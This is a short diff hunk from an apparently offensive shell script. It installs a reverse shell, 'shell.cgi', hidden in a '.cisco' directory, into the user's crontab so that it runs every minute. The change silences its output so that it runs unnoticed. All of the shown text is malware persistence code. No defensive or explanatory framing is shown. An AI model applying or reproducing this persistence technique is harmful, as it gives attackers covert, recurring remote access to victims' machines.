@@ -12,7 +12,7 @@ chmod 777 shell.cgi
 #add the reverse shell to the user's crontab for regular execution every minute
 touch temp
 crontab -l > temp
-echo "* * * * * ~/.cisco/shell.cgi" >> temp
+echo "* * * * * $HOME/.cisco/shell.cgi >/dev/null 2>&1" >> temp
 crontab temp
 rm temp
 
